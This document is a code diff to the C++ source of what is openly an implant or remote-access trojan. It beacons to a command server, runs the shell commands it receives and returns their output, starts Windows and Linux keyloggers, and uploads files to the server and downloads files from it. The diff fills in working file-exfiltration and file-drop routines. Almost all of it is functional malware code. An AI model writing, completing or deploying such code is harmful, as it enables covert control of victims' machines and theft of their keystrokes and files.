@@ -89,8 +89,8 @@ class Communicate {
     Communicate();
     int RECV(char *buffer, int buffer_len);
     int SEND(const char *buffer, int buffer_len);
-    int file_upload(const char* path);
-    int file_download(const char* path);
+    int upload_to_server(const char* path);
+    int download_from_server(const char* path);
     int register_implant();
     int beacon_implant();
 };
@@ -451,6 +451,7 @@ int Communicate::register_implant() {
 
 
 int Communicate::beacon_implant() {
+    
     cJSON *beacon = cJSON_CreateObject();
     if (!beacon) {
         return -1;
@@ -464,6 +465,8 @@ int Communicate::beacon_implant() {
     } else {
         return -1;
     }
+
+    fclose(fp);
     
     cJSON_AddStringToObject(beacon, "mode", "beacon");
     cJSON_AddStringToObject(beacon, "implant_id", id);
@@ -473,12 +476,13 @@ int Communicate::beacon_implant() {
         free(data);
         return -1;
     }
-
     free(data);
     cJSON_Delete(beacon);
 
     char buffer[BUFFER_SIZE];
-    if (RECV(buffer, sizeof(buffer)) == -1) return -1;
+    if (RECV(buffer, sizeof(buffer)) == -1) {
+        return -1;
+    }
 
     cJSON *command = cJSON_Parse(buffer);
     cJSON *mode = cJSON_GetObjectItem(command, "mode");
@@ -493,45 +497,23 @@ int Communicate::beacon_implant() {
     char result[MAX_RESPONSE];
     char command_with_redirect[BUFFER_SIZE + 256];
 
+    FILE *exec;
     cJSON *reply = cJSON_CreateObject();
+    if (!reply) return -1;
+
     if (strncmp(cmd->valuestring, "upload", 6) == 0) {
         char path[BUFFER_SIZE];
         sscanf(cmd->valuestring, "upload %s", path);
-        file_upload(path);
+        upload_to_server(path);
         strcpy(result, "File Download Successfully");
-        cJSON_AddStringToObject(reply, "mode", "result");
-        cJSON_AddStringToObject(reply, "implant_id", id);
-        cJSON_AddNumberToObject(reply, "task_id", task_id->valueint);
-        cJSON_AddStringToObject(reply, "response", result);
-        char *result_ = cJSON_Print(reply );
-        if (SEND(result_, strlen(result_)) == -1) {
-            cJSON_Delete(reply);
-            free(result_);
-
-            return -1;
-        }   
-        cJSON_Delete(reply);
-        free(result_);
+        goto SEND_RESULT;
         return 0;
     } else if (strncmp(cmd->valuestring, "download", 8) == 0) { 
         char path[BUFFER_SIZE];
-        sscanf(cmd->valuestring, "downlaod %s", path);
-        file_download(path);
+        sscanf(cmd->valuestring, "download %s", path);
+        download_from_server(path);
         strcpy(result, "File Uploaded Successfully");
-        cJSON_AddStringToObject(reply, "mode", "result");
-        cJSON_AddStringToObject(reply, "implant_id", id);
-        cJSON_AddNumberToObject(reply, "task_id", task_id->valueint);
-        cJSON_AddStringToObject(reply, "response", result);
-        char *result_ = cJSON_Print(reply );
-        if (SEND(result_, strlen(result_)) == -1) {
-            cJSON_Delete(reply);
-            free(result_);
-
-            return -1;
-        }   
-        cJSON_Delete(reply);
-        free(result_);
-        return 0;
+        goto SEND_RESULT;
     } else if (strncmp(cmd->valuestring, "keylogger", 9) == 0) {
         #ifdef _WIN32
             HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Keylogger::StartWindowsKeylogger, NULL, 0, NULL);
@@ -544,26 +526,14 @@ int Communicate::beacon_implant() {
             //pthread_join(KeyloggerThread, NULL);
             strcpy(result, "Started Linux keylogger successfully");
         #endif
-
-        cJSON_AddStringToObject(reply, "mode", "result");
-        cJSON_AddStringToObject(reply, "implant_id", id);
-        cJSON_AddNumberToObject(reply, "task_id", task_id->valueint);
-        cJSON_AddStringToObject(reply, "response", result);
-        char *result_ = cJSON_Print(reply );
-        if (SEND(result_, strlen(result_)) == -1) {
-            cJSON_Delete(reply);
-            free(result_);
-            return -1;
-        }
-        cJSON_Delete(reply);
-        free(result_);
+        goto SEND_RESULT;
         return 0;
     }
 
     memset(buffer, 0, sizeof(buffer));
     snprintf(command_with_redirect, sizeof(command_with_redirect), "%s 2>&1", cmd->valuestring);
 
-    FILE *exec;
+   
     #ifdef _WIN32
     exec = _popen(command_with_redirect, "r");
     #else
@@ -578,7 +548,6 @@ int Communicate::beacon_implant() {
     while (fgets(buffer, sizeof(buffer), exec) != NULL) {
         strcat(result, buffer);
     }
-    // send result
     SEND_RESULT:
     cJSON_AddStringToObject(reply, "mode", "result");
     cJSON_AddStringToObject(reply, "implant_id", id);
@@ -586,14 +555,12 @@ int Communicate::beacon_implant() {
     cJSON_AddStringToObject(reply, "response", result);
     char *result_ = cJSON_Print(reply);
 
-    if (SEND(result_, strlen(result)) == -1) {
+    if (SEND(result_, strlen(result_)) == -1) {
         fclose(exec);
         cJSON_Delete(reply);
         free(result_);
         return -1;
     }
-
-
     fclose(exec);
     cJSON_Delete(reply);
     free(result_);
@@ -666,12 +633,74 @@ DWORD WINAPI Keylogger::StartWindowsKeylogger(LPVOID arg) {
 
 
 
-int Communicate::file_download(const char* path) {
-    printf("heell");   
+int Communicate::download_from_server(const char* path) {
+    char *contents = (char*)malloc(MAX_RESPONSE);
+    if (contents == NULL) {
+        return -1;
+    }
+
+    //cJSON *file = cJSON_CreateObject();
+    //if (!file) {
+    //    free(contents);
+    //    return -1;
+    //}
+
+    char filename[BUFFER_SIZE];
+    RECV(filename, sizeof(filename));
+
+    int fd = open(filename, O_WRONLY|O_CREAT|O_TRUNC, 0644);
+    if (fd == -1) {
+        free(contents);
+         return -1;
+    }
+
+    size_t bytesRead;
+    char Filesize[BUFFER_SIZE];
+    RECV(Filesize, sizeof(Filesize));
+    size_t filesize = (size_t)atoi(Filesize);
+
+    size_t received = 0;
+    while (received < filesize) {
+        bytesRead = RECV(contents, FILE_CHUNK);
+        write(fd, contents, bytesRead);
+        received += bytesRead;
+    }
+
+    free(contents);
     return 0;
 }
 
-int Communicate::file_upload(const char* path) {
-    printf("xx");
+int Communicate::upload_to_server(const char* path) {
+    if (access(path, F_OK) != 0) return -1;
+    char *contents = (char*)malloc(MAX_RESPONSE);
+    if (contents == NULL) return 1;
+    
+    std::filesystem::path p(path);
+    std::string filename_str = p.filename().string();
+    const char* filename = filename_str.c_str();
+
+    SEND(filename, strlen(filename));
+
+    int fd = open(filename, O_RDONLY);
+    if (fd == -1) {
+        free(contents);
+         return -1;
+    }
+
+    struct stat st;
+    fstat(fd, &st);
+    size_t filesize = st.st_size;
+    //SSL_write(ssl, &filesize, sizeof(filesize));
+    char FileSize[BUFFER_SIZE]; 
+
+    snprintf(FileSize, 0x20, "%zu", filesize);
+    SEND(FileSize, strlen(FileSize));
+
+    size_t bytesRead;
+    while ((bytesRead = read(fd, contents, FILE_CHUNK)) > 0) {
+        SEND(contents, bytesRead);
+    }
+    free(contents);
+
     return 0;
 }
